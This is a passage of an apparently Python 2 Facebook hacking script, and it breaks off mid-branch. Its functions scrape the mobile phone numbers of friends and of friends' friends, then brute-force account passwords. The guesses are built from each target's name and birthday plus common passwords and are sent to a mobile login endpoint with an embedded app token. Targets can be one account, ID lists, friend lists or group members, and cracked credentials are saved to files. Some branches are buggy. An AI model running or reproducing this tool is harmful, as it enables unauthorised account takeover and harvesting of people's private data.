		os.rename('out/em_friends_from_friends.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### PHONE NUMBER #####
def phone_number():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		mkdir('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')
		print 42*"\033[1;97m═"
		url= "https://graph.facebook.com/me/friends?access_token="+fb_token
		r =requests.get(url)
		z=json.loads(r.text)
		make_action = open('out/nomer_friends.txt','w')
		for n in z["data"]:
			x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			try:
				hp.append(z['mobile_phone'])
				make_action.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		make_action.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/nomer_friends.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### PHONE NUMBER FROM FRIENDS #####
def phone_number_from_friends():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+fb_token)
		a = json.loads(r.text)
		mkdir('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		make_action = open('out/no_friends_from_friends.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+fb_token)
			z = json.loads(x.text)
			try:
				hpfromfriends.append(z['mobile_phone'])
				make_action.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		make_action.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromfriends))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/no_friends_from_friends.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		exit()

##### MENU HACK #####
def menu_hack():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Simple Facebook Hack(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Facebook Multi Bruteforce"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Strong Facebook Multi Bruteforce "
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Facebook BruteForce(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Yahoo Check"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choose_hack()
#----choices
def choose_hack():
	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if hack=="":
		print "\033[1;91m[!] Wrong input"
		choose_hack()
	elif hack =="1":
		mini()
	elif hack =="2":
		crack()
		success()
	elif hack =="3":
		super()
	elif hack =="4":
		brute()
	elif hack =="5":
		menu_yahoo()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		choose_hack()

##### MINI HF #####
def mini():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
	print 42*"\033[1;97m═"
	try:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
		mkdir('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		a = json.loads(r.text)
		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']
		mkdir('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')
		time.sleep(2)
		mkdir('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')
		time.sleep(2)
		print 42*"\033[1;97m═"
		pz1 = a['first_name']+'123'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if 'access_token' in y:
			print "\033[1;91m[+] \033[1;92mFound"
			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_hack()
		else:
			if 'www.facebook.com' in y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mFound"
				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
				menu_hack()
			else:
				pz2 = a['first_name'] + '12345'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if 'access_token' in y:
					print "\033[1;91m[+] \033[1;92mFound"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
					menu_hack()
				else:
					if 'www.facebook.com' in y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mFound"
						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
						menu_hack()
					else:
						pz3 = a['last_name'] + '123'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if 'access_token' in y:
							print "\033[1;91m[+] \033[1;92mFound"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
							menu_hack()
						else:
							if 'www.facebook.com' in y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mFound"
								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
								menu_hack()
							else:
								mode = a['birthday']
								pz4 = mode.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
									menu_hack()
								else:
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
										menu_hack()
									else:
										lahirs = a['birthday']
										jay = lahirs.replace('/', '')
										pz5 = a['first_name']+jay
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										if 'access_token' in y:
											print "\033[1;91m[+] \033[1;92mFound"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
											menu_hack()
										else:
											if 'www.facebook.com' in y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mFound"
												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
												menu_hack()
											else:
												pz6 = "bintang123"
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												if 'access_token' in y:
													print "\033[1;91m[+] \033[1;92mFound"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
													menu_hack()
												else:
													if 'www.facebook.com' in y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mFound"
														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
														menu_hack()
													else:
														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														if 'access_token' in y:
															print "\033[1;91m[+] \033[1;92mFound"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
															menu_hack()
														else:
															if 'www.facebook.com' in y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mFound"
																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
															else:
																print "\033[1;91m[!] Sorry, exit to open the target password :("
																print "\033[1;91m[!] try it another way."
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
	except KeyError:
		print "\033[1;91m[!] Terget not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_hack()


##### Multi Brute Force #####
##### CRACK ####
def crack():
	global idlist,passw,file
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
	try:
		file = open((idlist), "r")
		mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		for x in range(40):
			pick = threading.Thread(target=scrak, args=())
			pick.start()
			threads.append(pick)
		for pick in threads:
			pick.join()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_hack()

def scrak():
	global sucessful,checkpoint,action_failed,back,up
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		open_it = open(idlist, "r")
		up = open_it.read().split()
		while file:
			username = file.readline().strip()
			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			data = urllib.urlopen(url)
			mpsh = json.load(data)
			if back == (len(up)):
				break
			if 'access_token' in mpsh:
				bisa = open("out/mbf_ok.txt", "w")
				bisa.write(username+"|"+passw+"\n")
				bisa.close()
				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
				z = json.loads(x.text)
				sucessful.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
			elif 'www.facebook.com' in mpsh["error_msg"]:
				check_it = open("out/mbf_cp.txt", "w")
				check_it.write(username+"|"+passw+"\n")
				check_it.close()
				checkpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
			else:
				action_failed.append(username)
				back +=1
			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(sucessful))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(checkpoint)));sys.stdout.flush()
	except IOError:
		print"\n\033[1;91m[!] Sleep"
		time.sleep(0.01)
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"

def success():
	print
	print 42*"\033[1;97m═"
	###sucessful
	for b in sucessful:
		print(b)
	###CHECK
	for c in checkpoint:
		print(c)
	###action_failed
	print 42*"\033[1;97m═"
	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(action_failed)))
	exit()

############### SUPER MBF ################
def super():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.0)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack with list friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack from member group"
        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack from File"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choices_super()

def choices_super():
	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if peak =="":
		print "\033[1;91m[!] Wrong input"
		choices_super()
	elif peak =="1":
		os.system('clear')
		print logo
		mkdir('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		mkdir('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+fb_token)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+fb_token)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		mkdir('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+fb_token)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
        elif peak == "4":
                os.system('clear')
                print logo
                try:
                        idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
                        for line in open(idlist,'r').readlines():
                                id.append(line.strip())
                except KeyError:
                        print '\033[1;91m[!] File not found'
                        raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                        super()
	elif peak =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong input"
		choices_super()

        print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
        mkdir('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
        print 42*"\033[1;97m═"


	##### crack #####
	def main(arg):
		global checkpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass1+" =>"+z['name'])
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					check_it = open("out/output.txt", "a")
					check_it.write(user+"|"+pass1+"\n")
					check_it.close()
					checkpoint.append(user+pass1)
				else:
					#Pass2
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass2+" =>"+z['name'])
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							check_it = open("out/output.txt", "a")
							check_it.write(user+"|"+pass2+"\n")
							check_it.close()
							checkpoint.append(user+pass2)
						else:
							#Pass3
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass3+" =>"+z['name'])
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									check_it = open("out/output.txt", "a")
									check_it.write(user+"|"+pass3+"\n")
									check_it.close()
									checkpoint.append(user+pass3)
								else:
									#Pass4
									mode = b['birthday']
									pass4 = mode.replace('/', '')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass4+" =>"+z['name'])
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											check_it = open("out/output.txt", "a")
											check_it.write(user+"|"+pass4+"\n")
											check_it.close()
											checkpoint.append(user+pass4)
										else:
											#Pass5
											pass5 = "sayang123","sayangku123"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass5+" =>"+z['name'])
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													check_it = open("out/output.txt", "a")
													check_it.write(user+"|"+pass5+"\n")
													check_it.close()
													checkpoint.append(user+pass5)
												else:
													#Pass6
													pass6 = "bintang123","bintang12345"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass6+" =>"+z['name'])
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															check_it = open("out/output.txt", "a")
															check_it.write(user+"|"+pass6+"\n")
															check_it.close()
															checkpoint.append(user+pass6)
														else:
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
															b = json.loads(a.text)
															pass7 = "1234567890","password123","michelle","someone","","iloveyou","princess","playboy"
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass7+" =>"+z['name'])
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	check_it = open("out/output.txt", "a")
																	check_it.write(user+"|"+pass7+"\n")
																	check_it.close()
																	checkpoint.append(user+pass7)
                                                                                                                                else:
                                                                                                                                        #Pass8
